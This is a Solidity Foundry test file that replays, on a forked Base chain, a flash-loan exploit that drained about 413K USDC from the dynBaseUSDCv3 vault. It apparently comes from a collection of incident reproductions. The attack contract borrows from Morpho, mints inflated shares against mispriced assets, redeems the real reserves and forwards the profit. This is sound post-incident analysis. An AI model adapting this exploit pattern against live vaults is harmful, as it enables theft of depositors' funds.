// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 413.13K USDC plus residual vault shares
// Attacker : 0x5c2cbe53f2ce1b58532d4985a9b9d3db87d3af4c
// Attack Contract : 0x9ad48257024f8cd3ab7fde97c95950159fcaefae
// Vulnerable Contract : 0x67b93f6676bd1911c5fae7ffa90fff5f35e14dcd
// Victim : 0x67b93f6676bd1911c5fae7ffa90fff5f35e14dcd
// Attack Tx : https://basescan.org/tx/0x00b949bc3ed3edb58b04faedfbd8eb1db2edceae761382e80fe012919f8d3732

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x67b93f6676bd1911c5fae7ffa90fff5f35e14dcd#code
// Oracle Dependency : https://basescan.org/address/0x73b8c192bfc323c3ea224c88219d55dfc319e89f

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2048698708309705069
//
// dynBaseUSDCv3 priced non-USDC reserves through an oracle path configured with Uniswap V3 fee tier 42.
// The direct pools did not exist and the fallback token/WETH pools had zero liquidity, so totalAssets()
// only counted the idle USDC. The attacker deposited flash-loaned USDC, minted almost all vault shares,
// redeemed a proportional basket of the real reserves, repaid Morpho, and forwarded the residual assets.

address constant ATTACKER = 0x5C2cbe53f2CE1b58532D4985A9b9d3db87d3Af4c;
address constant PROFIT_RECEIVER = 0x25C08505b6c5Eba2D6C5d97c9E9a7F5f58d9A079;
address constant DYNA_VAULT = 0x67b93f6676bd1911c5FAe7Ffa90fFf5f35E14dCd;
address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
address constant USDC_TOKEN = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
address constant ZERO_LIQUIDITY_VAULT_A = 0x0FF79b6D6c0FB5faf54BD26db5Ce97062A105f81;
address constant META_MORPHO_VAULT_A = 0x3094b241AaDe60F91f1c82b0628A10d9501462F9;
address constant META_MORPHO_VAULT_B = 0xC8adBFCFaC975583c8684C4e12633907315Ca610;
address constant META_MORPHO_VAULT_C = 0xEbC997B855B9a4E0b6cd06E4758801E6Ff068e07;
address constant RESIDUAL_VAULT_TOKEN = 0xee05dbdcAf0CA060b973D5FC5B31e9B8327EDB39;

interface IDynaVault is IERC4626 {
    function redeemProportional(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256[] memory);
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant usdc = IERC20(USDC_TOKEN);

    function setUp() public {
        uint256 forkBlock = 45_183_966;
        uint256 attackBlock = 45_183_967;
        uint256 attackTimestamp = 1_777_157_281;

        vm.createSelectFork("base", forkBlock);
        vm.roll(attackBlock);
        vm.warp(attackTimestamp);

        fundingToken = USDC_TOKEN;
        attacker = PROFIT_RECEIVER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(PROFIT_RECEIVER, "Profit Receiver");
        vm.label(DYNA_VAULT, "dynBaseUSDCv3");
        vm.label(MORPHO, "Morpho");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(ZERO_LIQUIDITY_VAULT_A, "Redeemed Vault Token A");
        vm.label(META_MORPHO_VAULT_A, "MetaMorpho Vault A");
        vm.label(META_MORPHO_VAULT_B, "MetaMorpho Vault B");
        vm.label(META_MORPHO_VAULT_C, "MetaMorpho Vault C");
        vm.label(RESIDUAL_VAULT_TOKEN, "Residual Vault Token");
    }

    function testExploit() public balanceLog {
        uint256 flashAmount = 100_000_000_000;
        uint256 minUsdcProfit = 300_000_000_000;
        uint256 inflatedShareFloor = 420_000 ether;
        uint256 usdcProfitFloor = 413_000_000_000;
        uint256 residualMetaVaultFloor = 31_000 ether;
        uint256 receiverUsdcBefore = usdc.balanceOf(PROFIT_RECEIVER);
        uint256 receiverMetaVaultBefore = IERC20(META_MORPHO_VAULT_A).balanceOf(PROFIT_RECEIVER);

        SingularityDynaVaultAttack attack = new SingularityDynaVaultAttack(PROFIT_RECEIVER);
        vm.label(address(attack), "Local Attack Contract");

        // step 1: attacker starts the same flash-loan-funded vault share inflation path.
        vm.prank(ATTACKER);
        attack.execute(flashAmount, minUsdcProfit);

        uint256 usdcProfit = usdc.balanceOf(PROFIT_RECEIVER) - receiverUsdcBefore;
        uint256 residualMetaVaultProfit =
            IERC20(META_MORPHO_VAULT_A).balanceOf(PROFIT_RECEIVER) - receiverMetaVaultBefore;

        emit log_named_decimal_uint("Inflated dynBaseUSDCv3 Shares Minted", attack.mintedShares(), 18);
        logTokenBalance(USDC_TOKEN, PROFIT_RECEIVER, "Profit Receiver Final");

        assertGt(attack.mintedShares(), inflatedShareFloor, "deposit minted inflated vault shares");
        assertGt(usdcProfit, usdcProfitFloor, "USDC profit after flash-loan repayment");
        assertGt(residualMetaVaultProfit, residualMetaVaultFloor, "residual MetaMorpho shares forwarded");
        assertEq(usdc.balanceOf(address(attack)), 0, "attack helper forwarded USDC");
        assertEq(IERC20(META_MORPHO_VAULT_A).balanceOf(address(attack)), 0, "attack helper forwarded shares");
    }
}

contract SingularityDynaVaultAttack {
    address private immutable profitReceiver;
    uint256 public mintedShares;

    IERC20 private constant usdc = IERC20(USDC_TOKEN);
    IMorphoBuleFlashLoan private constant morpho = IMorphoBuleFlashLoan(MORPHO);
    IDynaVault private constant dynaVault = IDynaVault(DYNA_VAULT);

    address[5] private redeemableVaultTokens =
        [ZERO_LIQUIDITY_VAULT_A, META_MORPHO_VAULT_A, META_MORPHO_VAULT_B, META_MORPHO_VAULT_C, RESIDUAL_VAULT_TOKEN];

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function execute(
        uint256 flashAmount,
        uint256 minUsdcProfit
    ) external {
        uint256 receiverUsdcBefore = usdc.balanceOf(profitReceiver);

        // step 2: borrow USDC from Morpho and let the callback perform the vault deposit/redeem sequence.
        morpho.flashLoan(USDC_TOKEN, flashAmount, abi.encode(minUsdcProfit));

        // step 3: match the final profit path by forwarding every residual balance to the traced receiver.
        _forwardToken(USDC_TOKEN);
        for (uint256 i; i < redeemableVaultTokens.length; ++i) {
            _forwardToken(redeemableVaultTokens[i]);
        }

        require(usdc.balanceOf(profitReceiver) - receiverUsdcBefore >= minUsdcProfit, "profit below trace guard");
    }

    function onMorphoFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external {
        require(msg.sender == MORPHO, "only Morpho");
        uint256 minUsdcProfit = abi.decode(data, (uint256));

        // step 4: deposit the flash-loaned USDC while totalAssets only reports the idle USDC balance.
        usdc.approve(DYNA_VAULT, assets);
        mintedShares = dynaVault.deposit(assets, address(this));

        // step 5: redeem the inflated share position for a proportional basket of the vault's actual reserves.
        dynaVault.redeemProportional(mintedShares, address(this), address(this));

        // step 6: convert received ERC4626-like vault shares back into USDC where the trace shows maxRedeem > 0.
        for (uint256 i; i < redeemableVaultTokens.length; ++i) {
            _redeemAvailableShares(redeemableVaultTokens[i]);
        }

        // step 7: approve Morpho to pull the flash-loan principal after the callback returns.
        require(usdc.balanceOf(address(this)) >= assets + minUsdcProfit, "callback proceeds below guard");
        usdc.approve(MORPHO, assets);
    }

    function _redeemAvailableShares(
        address vaultToken
    ) private {
        uint256 shares = IERC4626(vaultToken).maxRedeem(address(this));
        if (shares != 0) {
            IERC4626(vaultToken).redeem(shares, address(this), address(this));
        }
    }

    function _forwardToken(
        address token
    ) private {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance != 0) {
            IERC20(token).transfer(profitReceiver, balance);
        }
    }
}
